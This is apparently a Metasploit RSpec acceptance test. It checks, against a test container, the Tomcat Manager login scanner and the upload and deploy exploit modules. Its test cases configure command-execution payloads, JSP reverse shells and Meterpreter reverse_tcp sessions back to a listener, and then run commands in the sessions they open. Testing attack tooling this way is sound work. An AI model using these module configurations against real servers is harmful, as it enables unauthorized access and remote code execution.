require 'acceptance_spec_helper'
require 'net/http'
require 'timeout'

RSpec.describe 'Tomcat Manager module targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  spawn_profile = ENV.fetch('TOMCAT_JAVA_SPAWN', '0')
  java_spawn = spawn_profile == 'default' ? nil : Integer(spawn_profile, 10)
  raise ArgumentError, 'TOMCAT_JAVA_SPAWN must be default, 0 or 2' unless [nil, 0, 2].include?(java_spawn)

  java_spawn_description = java_spawn.nil? ? 'default Spawn=2' : "Spawn=#{java_spawn}"

  before(:all) do
    next unless java_spawn.nil?

    expect(target_exec('tomcat', 'java', '-version')).to include('1.8.0_504-b01')
    environment = target_exec('tomcat', 'cat', '/proc/1/environ').split("\0")
    expect(environment.grep(/^JDK_JAVA_OPTIONS=/).length).to eq(1)
    expect(environment.grep(/^JDK_JAVA_OPTIONS=/).first).to include('--add-opens=java.base/java.lang=ALL-UNNAMED')
    expect(environment.grep(/^JAVA_TOOL_OPTIONS=/)).to be_empty
    expect(target_exec('tomcat', 'sha256sum', '/usr/local/tomcat/bin/catalina.sh')).to start_with('39b5170cf75bf9019df1f5e38c86f5f9175e31fde71ab88c3273e455b4899d7e ')
    # Read the actual packaged payload default without supplying Spawn to any
    # exploit. Its generated configuration and SDK identity were checked natively.
    defaults = console_command(%q{irb -e 'puts "MODULE_TARGET_JAVA_DEFAULT=" + framework.payloads.create("java/meterpreter/reverse_tcp").datastore["Spawn"].to_s; puts "MODULE_TARGET_JAVA_SDK=" + Digest::SHA256.hexdigest(MetasploitPayloads.read("java/metasploit/Payload.class"))'})
    expect(defaults).to match(/^MODULE_TARGET_JAVA_DEFAULT=2$/)
    expect(defaults).to match(/^MODULE_TARGET_JAVA_SDK=f2d768ccb588b5bb61d18769b04c2adcc92ec17ca00032808a1aad8235820c0b$/)
  end

  before do
    response = manager_request('/manager/text/serverinfo')
    expect(response.code).to eq('200')
    expect(response.body).to include('Tomcat/9.0.123', 'OS Name: [Linux]')
    expect(response.body).to include('JVM Version: [1.8.0_504-b01]') if java_spawn.nil?
    # Keep repeated preflights from locking the real fixture account in Tomcat's
    # default LockOutRealm; the individual negative cases still test its password.
    expect(manager_request('/manager/html', username: 'module-target-unknown-user', password: 'wrong-password').code).to eq('401')
  end

  it 'finds one valid Manager credential' do
    output = run_target_module('auxiliary/scanner/http/tomcat_mgr_login', 'tomcat', login_options('tomcat'))
    expect(output).to include('Login Successful: tomcat:tomcat')
  end

  it 'rejects one invalid Manager credential' do
    output = run_target_module('auxiliary/scanner/http/tomcat_mgr_login', 'tomcat', login_options('wrong-password'), allow_errors: true)
    expect(output).to include('LOGIN FAILED: tomcat:wrong-password')
    expect(output).not_to include('Login Successful')
  end

  {
    'tomcat_mgr_upload' => { 'TARGETURI' => '/manager', 'TARGET' => 0 },
    'tomcat_mgr_deploy' => { 'PATH' => '/manager/text', 'TARGET' => 1 }
  }.each do |name, options|
    context name do
      let(:fullname) { "exploit/multi/http/#{name}" }
      let(:credentials) { { 'HttpUsername' => 'tomcat', 'HttpPassword' => 'tomcat' } }

      it 'recognizes an authenticated Manager' do
        output = run_target_module(fullname, 'tomcat', options.merge(credentials), action: 'check')
        expect(output).to include('The target appears to be vulnerable')
      end

      it 'does not report invalid credentials as an exploitable Manager' do
        output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge('HttpPassword' => 'wrong-password'), action: 'check', allow_errors: true)
        expect(output).to include('Server rejected the provided credentials')
        expect(output).not_to include('The target appears to be vulnerable')
      end

      it 'executes a Linux x86 payload twice and removes deployments and temporary executables' do
        original_apps = deployed_apps
        original_files = deployment_files
        original_temporary_files = temporary_files
        2.times do
          proof_path = '/tmp/module-target-executable-proof'
          target_exec('tomcat', 'test', '!', '-e', proof_path)
          output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge(
            'TARGET' => name == 'tomcat_mgr_upload' ? 2 : 3,
            'PAYLOAD' => 'linux/x86/exec', 'CMD' => "/usr/bin/touch #{proof_path}",
            'DisablePayloadHandler' => true, 'WfsDelay' => 0
          ))
          expect(output).not_to include('session opened')
          expect(output).not_to match(/Failed to undeploy|Unable to access Tomcat Manager to undeploy|Undeployment failed|Deletion failed/)
          wait_for_expect(20, 0.1) do
            native = target_exec('tomcat', 'sh', '-c', "if test -f #{proof_path}; then echo executable-proof; fi")
            expect(native.strip).to eq('executable-proof')
          end
          target_exec('tomcat', 'rm', '-f', proof_path)
          expect(deployed_apps).to eq(original_apps)
          expect(deployment_files).to eq(original_files)
          expect(temporary_files).to eq(original_temporary_files)
        end
      end

      targets = name == 'tomcat_mgr_deploy' ? [0, 1] : [0]
      targets.product(%w[java/jsp_shell_reverse_tcp java/meterpreter/reverse_tcp]).each do |target, payload|
        payload_description = payload.include?('meterpreter') ? "#{payload} (#{java_spawn_description})" : payload
        it "opens #{payload_description} sessions twice with target #{target} and removes each deployment" do
          original_apps = deployed_apps
          original_files = deployment_files
          original_java_temporary_files = java_temporary_files if java_spawn.nil?
          payload_options = payload.include?('meterpreter') && !java_spawn.nil? ? { 'Spawn' => java_spawn } : {}
          2.times do
            proof_path = '/tmp/module-target-session-proof'
            target_exec('tomcat', 'rm', '-f', proof_path)
            target_exec('tomcat', 'test', '!', '-e', proof_path)
            output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge(payload_options).merge(
              'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10, 'DisablePayloadHandler' => false
            ), action: 'run -z')
            expect(output).not_to match(/Failed to undeploy|Unable to access Tomcat Manager to undeploy|Undeployment failed|Deletion failed/)
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            command = payload.include?('meterpreter') ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
            flag = payload.include?('meterpreter') ? '-C' : '-c'
            proof = console_command("sessions -i #{session_id} #{flag} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(20, 0.1) do
              native = target_exec('tomcat', 'sh', '-c', "if test -f #{proof_path}; then echo session-proof; fi")
              expect(native.strip).to eq('session-proof')
            end
            # Kill the live JVM payload before the next run, then verify that the
            # Manager and the filesystem both agree undeployment completed.
            expect(console_command('sessions -K')).not_to match(/\[-\]|Exception|Unknown command/)
            target_exec('tomcat', 'rm', '-f', proof_path)
            expect(deployed_apps).to eq(original_apps)
            expect(deployment_files).to eq(original_files)
            next unless java_spawn.nil?

            Timeout.timeout(10) do
              wait_for_expect(100, 0.1) do
                expect(java_temporary_files).to eq(original_java_temporary_files)
                expect(target_exec('tomcat', 'ps', '-ww', '-eo', 'args').lines.grep(/\bmetasploit\.Payload\b/)).to be_empty
              end
            end
          end
        end
      end
    end
  end

  def deployment_files
    target_exec('tomcat', 'find', '/usr/local/tomcat/webapps', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.sort
  end

  def temporary_files
    target_exec('tomcat', 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-type', 'f', '-printf', '%f\n').lines.sort
  end

  def java_temporary_files
    target_exec('tomcat', 'find', '/usr/local/tomcat/temp', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.sort
  end

  def deployed_apps
    response = manager_request('/manager/text/list')
    expect(response.code).to eq('200')
    expect(response.body).to start_with('OK - Listed applications')
    # Manager sessions legitimately change as its HTML app issues CSRF tokens.
    response.body.lines.drop(1).map do |line|
      path, state, _sessions, base = line.strip.split(':', 4)
      [path, state, base]
    end.sort
  end

  def manager_request(path, username: 'tomcat', password: 'tomcat')
    endpoint = target_endpoint('tomcat')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 3
    http.read_timeout = 3
    request = Net::HTTP::Get.new(path)
    request.basic_auth(username, password)
    http.request(request)
  end

  def login_options(password)
    {
      'USERNAME' => 'tomcat', 'PASSWORD' => password, 'TARGETURI' => '/manager/html',
      'USERPASS_FILE' => nil, 'USER_FILE' => nil, 'PASS_FILE' => nil,
      'BLANK_PASSWORDS' => false, 'USER_AS_PASS' => false, 'STOP_ON_SUCCESS' => true
    }
  end
end
